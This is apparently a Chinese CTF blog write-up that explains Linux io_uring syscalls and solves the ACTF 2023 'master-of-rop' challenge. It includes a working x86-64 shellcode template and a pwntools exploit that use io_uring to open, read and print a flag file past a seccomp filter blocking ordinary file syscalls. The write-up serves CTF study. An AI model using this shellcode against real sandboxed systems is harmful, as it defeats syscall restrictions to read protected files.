+++
date = '2025-08-23T13:56:19+08:00'
draft = false
title = 'io_uring'
categories = ["pwn"]


+++

突破沙箱规则，实现orw

<!--more-->



## 基础知识

`io_uring`涉及三个系统调用

- `io_uring_setup(2)`
- `io_uring_register(2)`
- `io_uring_enter(2)`

### `io_uring_setup`

用于初始化执行异步IO的上下文

```c
       #include <liburing.h>

       int io_uring_setup(u32 entries, struct io_uring_params *p);
```

这个系统调用

- **创建一个 SQ 和一个 CQ**
- 返回一个文件描述符，随后作为其他相关系统调用的参数

SQ 和 CQ 在应用和内核之间共享（需要用到mmap，还需要mmap SQEs），避免了在初始化和完成 I/O 时（initiating and completing I/O）拷贝数据。

参数：

- `entries`参数：
	设置SQ和CQ的初始容量**至少**为`entries`（至少是因为`entries`必须是2的幂次方（如32、64、512等），如果不是内核也会**自动对齐到最近的更大幂次值**（如传入100会被调整为128））

-  `io_uring_params`结构体：

	**一般都是把`io_uring_params`初始化然后清零，再传入`io_uring_setup`，内核再将一些返回的信息写入这个结构体**

```c
struct io_uring_params {
    __u32 sq_entries;          // 实际提交队列（SQ）大小
    __u32 cq_entries;          // 实际完成队列（CQ）大小
    __u32 flags;               // 创建 io_uring 的标志（由用户指定），为0采用中断驱动模式
    __u32 sq_thread_cpu;       // SQ polling 线程绑定的 CPU
    __u32 sq_thread_idle;      // SQ polling 线程空闲休眠时间
    __u32 features;            // 内核支持的特性标志
    __u32 wq_fd;               // 共享 workqueue 的 io_uring 实例 fd
    __u32 resv[3];             // 保留字段,必须为0
    struct io_sqring_offsets sq_off;   // SQ 环形队列的偏移信息
    struct io_cqring_offsets cq_off;   // CQ 环形队列的偏移信息
};
```



```c
struct io_sqring_offsets {
    __u32 head;        // SQ 的 head 指针（用户态消费，内核读取）
    __u32 tail;        // SQ 的 tail 指针（用户态生产，内核读取）
    __u32 ring_mask;   // 环大小掩码，用于索引取模
    __u32 ring_entries;// SQ ring 的 entry 总数
    __u32 flags;       // SQ 状态标志位
    __u32 dropped;     // 内核丢弃的 SQE 数量
    __u32 array;       // SQE 索引数组（存放 SQE 的顺序）
    __u32 resv1;       // 保留字段
    __u64 user_addr;   // 用户自定义地址（较新内核引入）
};
```



```c
struct io_cqring_offsets {
    __u32 head;        // CQ 的 head 指针（用户态消费）
    __u32 tail;        // CQ 的 tail 指针（内核生产）
    __u32 ring_mask;   // 环大小掩码，用于索引取模
    __u32 ring_entries;// CQ ring 的 entry 总数
    __u32 overflow;    // CQ 溢出计数
    __u32 cqes;        // CQE 数组起始偏移
    __u32 flags;       // CQ 状态标志
    __u32 resv1;       // 保留
    __u64 user_addr;   // 用户自定义地址
};
```



### `io_uring_enter`



```c
       #include <liburing.h>

       int io_uring_enter(unsigned int fd, unsigned int to_submit,
                          unsigned int min_complete, unsigned int flags,
                          sigset_t *sig);
```

这个系统调用用于初始化和完成（initiate and complete）I/O，使用共享的 SQ 和 CQ。 单次调用同时执行：

- 提交新的 I/O 请求
- 等待 I/O 完成

参数：

- `fd` 是 `io_uring_setup()` 返回的文件描述符
- `to_submit` 告知内核当前有多少个 SQE已准备就绪，可以立即被消费和提交
- `min_complete`默认模式，会等待这个数量的 I/O 事件完成再返回
- `flags`用于控制内核行为
- `sig`设置进程的信号屏蔽状态，如：是否会被`Ctrl+c`终止。进行orw的话，置0就行



**io_uring_sqe**

用于传递IO操作的具体信息

`opcode`：决定执行什么操作，其中包含一些文件IO操作(如：一些等价于open、write的操作)、进程管理操作等





```c
           /*
            * IO submission data structure (Submission Queue Entry)
            */
           struct io_uring_sqe {
                __u8 opcode;        /* type of operation for this sqe */
                __u8 flags;         /* IOSQE_ flags */
                __u16     ioprio;        /* ioprio for the request */
                __s32     fd;       /* file descriptor to do IO on */
                union {
                     __u64     off; /* offset into file */
                     __u64     addr2;
                     struct {
                          __u32     cmd_op;
                          __u32     __pad1;
                     };
                };
                union {
                     __u64     addr;     /* pointer to buffer or iovecs */
                     __u64     splice_off_in;
                     struct {
                          __u32     level;
                          __u32     optname;
                     };
                };
                __u32     len;      /* buffer size or number of iovecs */
                union {
                     __kernel_rwf_t rw_flags;
                     __u32          fsync_flags;
                     __u16          poll_events;   /* compatibility */
                     __u32          poll32_events; /* word-reversed for BE */
                     __u32          sync_range_flags;
                     __u32          msg_flags;
                     __u32          timeout_flags;
                     __u32          accept_flags;
                     __u32          cancel_flags;
                     __u32          open_flags;
                     __u32          statx_flags;
                     __u32          fadvise_advice;
                     __u32          splice_flags;
                     __u32          rename_flags;
                     __u32          unlink_flags;
                     __u32          hardlink_flags;
                     __u32          xattr_flags;
                     __u32          msg_ring_flags;
                     __u32          uring_cmd_flags;
                     __u32          waitid_flags;
                     __u32          futex_flags;
                     __u32          install_fd_flags;
                     __u32          nop_flags;
                };
                __u64     user_data;     /* data to be passed back at completion time */
                /* pack this to avoid bogus arm OABI complaints */
                union {
                     /* index into fixed buffers, if used */
                     __u16     buf_index;
                     /* for grouped buffer selection */
                     __u16     buf_group;
                } __attribute__((packed));
                /* personality to use, if used */
                __u16     personality;
                union {
                     __s32     splice_fd_in;
                     __u32     file_index;
                     __u32     optlen;
                     struct {
                          __u16     addr_len;
                          __u16     __pad3[1];
                     };
                };
                union {
                     struct {
                          __u64     addr3;
                          __u64     __pad2[1];
                     };
                     __u64     optval;
                     /*
                      * If the ring is initialized with IORING_SETUP_SQE128, then
                      * this field is used for 80 bytes of arbitrary command data
                      */
                     __u8 cmd[0];
                };
           };
```





### 模板

```python
from pwn import *


"""
    rsp+0x100   0x078: struct io_uring_params params = {};
    rsp+0x200   0x008: uring_fd
    rsp+0x208   0x008: sq_ring ptr
    rsp+0x210   0x008: cq_ring ptr
    rsp+0x218   0x008: sqes ptr
    rsp+0x220   0x008: flag_fd
    rsp+0x300   0x100: buffer
"""
shellcode = asm("""
/*视情况调整栈帧*/
    add rsp, 0x2000
/*int uring_fd = syscall(SYS_io_uring_setup, 16, &params);*/
    mov rax, 0
    lea rdi, [rsp+0x100]
    mov rcx, 15
    rep stosq
    mov rdi, 16
    lea rsi, [rsp+0x100]
    mov rax, 0x1a9
    syscall
/*unsigned char *sq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING);*/
    mov qword ptr [rsp+0x200], rax
    xor rdi, rdi
    mov rsi, 0x1000
    mov rdx, 3
    mov r10, 1
    mov r8, qword ptr [rsp+0x200]
    mov r9, 0
    mov rax, 9
    syscall
    mov qword ptr [rsp+0x208], rax
/*unsigned char *cq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING);*/
    xor rdi, rdi
    mov rsi, 0x1000
    mov rdx, 3
    mov r10, 1
    mov r8, qword ptr [rsp+0x200]
    mov r9, 0x8000000
    mov rax, 9
    syscall
    mov qword ptr [rsp+0x210], rax
/*struct io_uring_sqe *sqes = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES);*/
    xor rdi, rdi
    mov rsi, 0x1000
    mov rdx, 3
    mov r10, 1
    mov r8, qword ptr [rsp+0x200]
    mov r9, 0x10000000
    mov rax, 9
    syscall
    mov qword ptr [rsp+0x218], rax

/*openat*/
    mov rax, 0
    mov rdi, qword ptr [rsp+0x218]
    mov rcx, 8
    rep stosq
    mov rdi, qword ptr [rsp+0x218]
    mov byte ptr [rdi], 18 	/*opcode*/
    mov byte ptr [rdi+1], 0	/* IOSQE_ flags*/
    mov dword ptr [rdi+4], -100	/* file descriptor to do IO on */
    /* 要打开文件的路径存放在 rsp+0x300 处 */
    mov rax, 0x67616c662f2e
    mov qword ptr [rsp+0x300], rax
    lea rax, [rsp+0x300]
    mov qword ptr [rdi+16], rax /*pathname*/
    mov dword ptr [rdi+28], 0	/*open_flag*/

    mov rdi, qword ptr [rsp+0x208]
    mov edx, dword ptr [rsp+0x140]
    add rdi, rdx
    mov dword ptr [rdi], 0

    mov rdi, qword ptr [rsp+0x208]
    mov edx, dword ptr [rsp+0x12c]
    add rdi, rdx
    add dword ptr [rdi], 1

    mov rdi, qword ptr [rsp+0x200]
    mov rsi, 1
    mov rdx, 1
    mov r10, 1
    xor r8, r8
    xor r9, r9
    mov rax, 0x1aa
    syscall

    mov rdi, qword ptr [rsp+0x210]
    mov edx, dword ptr [rsp+0x164]
    add rdi, rdx
    mov edx, dword ptr [rdi+8]
    mov qword ptr [rsp+0x220], rdx

 /*read*/
    mov rax, 0
    mov rdi, qword ptr [rsp+0x218]
    mov rcx, 8
    rep stosq
    mov rdi, qword ptr [rsp+0x218]
    mov byte ptr [rdi], 22
    mov rax, qword ptr [rsp+0x220]
    mov dword ptr [rdi+4], eax
    lea rax, [rsp+0x300]
    mov qword ptr [rdi+16], rax
    mov dword ptr [rdi+24], 0x100

    mov rdi, qword ptr [rsp+0x208]
    mov edx, dword ptr [rsp+0x140]
    add rdi, rdx
    mov dword ptr [rdi], 0

    mov rdi, qword ptr [rsp+0x208]
    mov edx, dword ptr [rsp+0x12c]
    add rdi, rdx
    add dword ptr [rdi], 1

    mov rdi, qword ptr [rsp+0x200]
    mov rsi, 1
    mov rdx, 1
    mov r10, 1
    xor r8, r8
    xor r9, r9
    mov rax, 0x1aa
    syscall

/*write*/
    mov rax, 0
    mov rdi, qword ptr [rsp+0x218]
    mov rcx, 8
    rep stosq
    mov rdi, qword ptr [rsp+0x218]
    mov byte ptr [rdi], 23
    mov dword ptr [rdi+4], 1
    lea rax, [rsp+0x300]
    mov qword ptr [rdi+16], rax
    mov dword ptr [rdi+24], 0x100

    mov rdi, qword ptr [rsp+0x208]
    mov edx, dword ptr [rsp+0x140]
    add rdi, rdx
    mov dword ptr [rdi], 0

    mov rdi, qword ptr [rsp+0x208]
    mov edx, dword ptr [rsp+0x12c]
    add rdi, rdx
    add dword ptr [rdi], 1

    mov rdi, qword ptr [rsp+0x200]
    mov rsi, 1
    mov rdx, 3
    mov r10, 1
    xor r8, r8
    xor r9, r9
    mov rax, 0x1aa
    syscall
""")
```



**mmap映射**：

在初始化`io_uring`的时候，分别对`SQ`、`CQ`、`SQEs`进行了三次mmap映射，`offset`参数需要分别设置为`IORING_OFF_SQ_RING`、`IORING_OFF_CQ_RING`、`IORING_OFF_SQES`

```c
#define IORING_OFF_SQ_RING 0ULL
#define IORING_OFF_CQ_RING 0x8000000ULL
#define IORING_OFF_SQES 0x10000000ULL
```





### liburing

实现了对底层系统调用的封装

初始化与清理

```c
struct io_uring ring;
// 初始化 (默认128条目)
int io_uring_queue_init(unsigned entries, struct io_uring *ring, unsigned flags);
// 清理资源
void io_uring_queue_exit(struct io_uring *ring);
```

提交队列管理

```c
// 获取下一个可用的 SQE
struct io_uring_sqe *io_uring_get_sqe(struct io_uring *ring);
// 批量提交 SQE
int io_uring_submit(struct io_uring *ring);
```

操作准备函数

```c
// 准备读操作
void io_uring_prep_read(struct io_uring_sqe *sqe, int fd, void *buf, unsigned nbytes, off_t offset);
// 准备写操作
void io_uring_prep_write(struct io_uring_sqe *sqe, int fd, const void *buf, unsigned nbytes, off_t offset);
// 准备打开操作
void io_uring_prep_openat(struct io_uring_sqe *sqe, int dfd, const char *path, int flags, mode_t mode);
// 准备关闭操作
void io_uring_prep_close(struct io_uring_sqe *sqe, int fd);
```

完成处理

```c
// 等待完成事件
int io_uring_wait_cqe(struct io_uring *ring, struct io_uring_cqe **cqe);
// 查看完成事件(非阻塞)
int io_uring_peek_cqe(struct io_uring *ring, struct io_uring_cqe **cqe);
// 标记事件已处理
void io_uring_cqe_seen(struct io_uring *ring, struct io_uring_cqe *cqe);
```

进行orw

```c
// gcc -o shellcode shellcode.c -luring -lseccomp -static
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <liburing.h>
#include <seccomp.h>
#include <syscall.h>

#define BUFFER_SIZE 4096

int main() {
    struct io_uring ring;
    struct io_uring_cqe *cqe;
    struct io_uring_sqe *sqe;
    char buffer[BUFFER_SIZE] = {0};
    int fd;
    
    io_uring_queue_init(16, &ring, 0);
    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_openat(sqe, AT_FDCWD, "flag", O_RDONLY, 0);
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    fd = cqe->res;

    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_read(sqe, fd, buffer, BUFFER_SIZE, 0);
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    
    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_write(sqe, STDOUT_FILENO, buffer, BUFFER_SIZE, 0);
    io_uring_submit(&ring);

    io_uring_queue_exit(&ring);

    return 0;
}
```









## ACTF 2023 master-of-rop



沙箱禁掉了常用的orw及其替代syscall，需要寻找一些其他的替代syscall

```sh
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x19 0xc000003e  if (A != ARCH_X86_64) goto 0027
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x16 0xffffffff  if (A != 0xffffffff) goto 0027
 0005: 0x15 0x15 0x00 0x00000000  if (A == read) goto 0027
 0006: 0x15 0x14 0x00 0x00000001  if (A == write) goto 0027
 0007: 0x15 0x13 0x00 0x00000002  if (A == open) goto 0027
 0008: 0x15 0x12 0x00 0x00000011  if (A == pread64) goto 0027
 0009: 0x15 0x11 0x00 0x00000012  if (A == pwrite64) goto 0027
 0010: 0x15 0x10 0x00 0x00000013  if (A == readv) goto 0027
 0011: 0x15 0x0f 0x00 0x00000014  if (A == writev) goto 0027
 0012: 0x15 0x0e 0x00 0x00000028  if (A == sendfile) goto 0027
 0013: 0x15 0x0d 0x00 0x0000002c  if (A == sendto) goto 0027
 0014: 0x15 0x0c 0x00 0x0000002e  if (A == sendmsg) goto 0027
 0015: 0x15 0x0b 0x00 0x0000003b  if (A == execve) goto 0027
 0016: 0x15 0x0a 0x00 0x00000101  if (A == openat) goto 0027
 0017: 0x15 0x09 0x00 0x00000127  if (A == preadv) goto 0027
 0018: 0x15 0x08 0x00 0x00000128  if (A == pwritev) goto 0027
 0019: 0x15 0x07 0x00 0x0000012f  if (A == name_to_handle_at) goto 0027
 0020: 0x15 0x06 0x00 0x00000130  if (A == open_by_handle_at) goto 0027
 0021: 0x15 0x05 0x00 0x00000142  if (A == execveat) goto 0027
 0022: 0x15 0x04 0x00 0x00000147  if (A == preadv2) goto 0027
 0023: 0x15 0x03 0x00 0x00000148  if (A == pwritev2) goto 0027
 0024: 0x15 0x02 0x00 0x000001ac  if (A == 0x1ac) goto 0027
 0025: 0x15 0x01 0x00 0x000001b5  if (A == 0x1b5) goto 0027
 0026: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0027: 0x06 0x00 0x00 0x00000000  return KILL
```



### 确定内核版本

首先需要确定内核版本

确定内核版本的方法：

以我本地为例，我的内核版本` 6.6.87`，但是我去调用一些新内核版本才有的系统调用：

```
shellcode = asm('''
    mov rax, 454
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx
    syscall
    
    ''')
```

这个syscall的返回值存在RAX是：`0xffffffffffffffda`，在 64 位有符号数下就是 `-38`。表示 **`syscall` 返回了 -ENOSYS，说明该系统调用在你这个内核版本中不存在**。

远程的话不会回显，可以通过 `cmp rax, -38`判断，如果ENOSYS就wirte一些信息

### 寻找代替系统调用

由于禁掉了常用的一些orw系统调用，需要去寻找其他替代的系统调用来orw

别人测得的版本小于 `6.1.60`

以 `linux-5.15.137` 为参考

深入`SYS_openat`后发现，其主要逻辑是调用`do_filp_open`，而`do_file_open`又会被`io_uring.c`这个文件调用。

了解`io_uring`之后发现其能够替代orw，至此，确定了通过`io_uring`实现orw

### 实现

`liburing`提供了对底层系统调用的封装，但是看了看，还是觉得直接用系统调用写shellcode比较简单，这里直接用模板

exp:

```python
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
context(os='linux',arch='amd64',log_level='debug')
def dbg():
    gdb.attach(p)
    # pause()

address = './pwn'
p = process(address)

elf = ELF(address)
libc = elf.libc

# ip = ""
# port = 
#p = remote(ip,port)

shellcode = asm("""
/*视情况调整栈帧*/
    add rsp, 0x2000
/*int uring_fd = syscall(SYS_io_uring_setup, 16, &params);*/
    mov rax, 0
    lea rdi, [rsp+0x100]
    mov rcx, 15
    rep stosq
    mov rdi, 16
    lea rsi, [rsp+0x100]
    mov rax, 0x1a9
    syscall
/*unsigned char *sq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING);*/
    mov qword ptr [rsp+0x200], rax
    xor rdi, rdi
    mov rsi, 0x1000
    mov rdx, 3
    mov r10, 1
    mov r8, qword ptr [rsp+0x200]
    mov r9, 0
    mov rax, 9
    syscall
    mov qword ptr [rsp+0x208], rax
/*unsigned char *cq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING);*/
    xor rdi, rdi
    mov rsi, 0x1000
    mov rdx, 3
    mov r10, 1
    mov r8, qword ptr [rsp+0x200]
    mov r9, 0x8000000
    mov rax, 9
    syscall
    mov qword ptr [rsp+0x210], rax
/*struct io_uring_sqe *sqes = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES);*/
    xor rdi, rdi
    mov rsi, 0x1000
    mov rdx, 3
    mov r10, 1
    mov r8, qword ptr [rsp+0x200]
    mov r9, 0x10000000
    mov rax, 9
    syscall
    mov qword ptr [rsp+0x218], rax

/*openat*/
    mov rax, 0
    mov rdi, qword ptr [rsp+0x218]
    mov rcx, 8
    rep stosq
    mov rdi, qword ptr [rsp+0x218]
    mov byte ptr [rdi], 18 	/*opcode*/
    mov byte ptr [rdi+1], 0	/* IOSQE_ flags*/
    mov dword ptr [rdi+4], -100	/* file descriptor to do IO on */
    /* 要打开文件的路径存放在 rsp+0x300 处 */
    mov rax, 0x67616c662f2e
    mov qword ptr [rsp+0x300], rax
    lea rax, [rsp+0x300]
    mov qword ptr [rdi+16], rax /*pathname*/
    mov dword ptr [rdi+28], 0	/*open_flag*/

    mov rdi, qword ptr [rsp+0x208]
    mov edx, dword ptr [rsp+0x140]
    add rdi, rdx
    mov dword ptr [rdi], 0

    mov rdi, qword ptr [rsp+0x208]
    mov edx, dword ptr [rsp+0x12c]
    add rdi, rdx
    add dword ptr [rdi], 1

    mov rdi, qword ptr [rsp+0x200]
    mov rsi, 1
    mov rdx, 1
    mov r10, 1
    xor r8, r8
    xor r9, r9
    mov rax, 0x1aa
    syscall

    mov rdi, qword ptr [rsp+0x210]
    mov edx, dword ptr [rsp+0x164]
    add rdi, rdx
    mov edx, dword ptr [rdi+8]
    mov qword ptr [rsp+0x220], rdx

 /*read*/
    mov rax, 0
    mov rdi, qword ptr [rsp+0x218]
    mov rcx, 8
    rep stosq
    mov rdi, qword ptr [rsp+0x218]
    mov byte ptr [rdi], 22
    mov rax, qword ptr [rsp+0x220]
    mov dword ptr [rdi+4], eax
    lea rax, [rsp+0x300]
    mov qword ptr [rdi+16], rax
    mov dword ptr [rdi+24], 0x100

    mov rdi, qword ptr [rsp+0x208]
    mov edx, dword ptr [rsp+0x140]
    add rdi, rdx
    mov dword ptr [rdi], 0

    mov rdi, qword ptr [rsp+0x208]
    mov edx, dword ptr [rsp+0x12c]
    add rdi, rdx
    add dword ptr [rdi], 1

    mov rdi, qword ptr [rsp+0x200]
    mov rsi, 1
    mov rdx, 1
    mov r10, 1
    xor r8, r8
    xor r9, r9
    mov rax, 0x1aa
    syscall

/*write*/
    mov rax, 0
    mov rdi, qword ptr [rsp+0x218]
    mov rcx, 8
    rep stosq
    mov rdi, qword ptr [rsp+0x218]
    mov byte ptr [rdi], 23
    mov dword ptr [rdi+4], 1
    lea rax, [rsp+0x300]
    mov qword ptr [rdi+16], rax
    mov dword ptr [rdi+24], 0x100

    mov rdi, qword ptr [rsp+0x208]
    mov edx, dword ptr [rsp+0x140]
    add rdi, rdx
    mov dword ptr [rdi], 0

    mov rdi, qword ptr [rsp+0x208]
    mov edx, dword ptr [rsp+0x12c]
    add rdi, rdx
    add dword ptr [rdi], 1

    mov rdi, qword ptr [rsp+0x200]
    mov rsi, 1
    mov rdx, 3
    mov r10, 1
    xor r8, r8
    xor r9, r9
    mov rax, 0x1aa
    syscall
""")

p.recvuntil(b'code\n')
# dbg()
p.send(shellcode)


p.interactive()

```

可能要多打几次才能打通



## 参考文章

https://www.yuque.com/xiaocangxu/pwn/pd2zc37ebgbanvau#vqGHAs

https://kernel.dk/io_uring.pdf

[[译] Linux 异步 I/O 框架 io_uring：基本原理、程序示例与性能压测（2020）](https://arthurchiao.art/blog/intro-to-io-uring-zh/)

[星盟WP](https://blog.xmcve.com/2023/10/31/ACTF-2023-Writeup/#title-9)



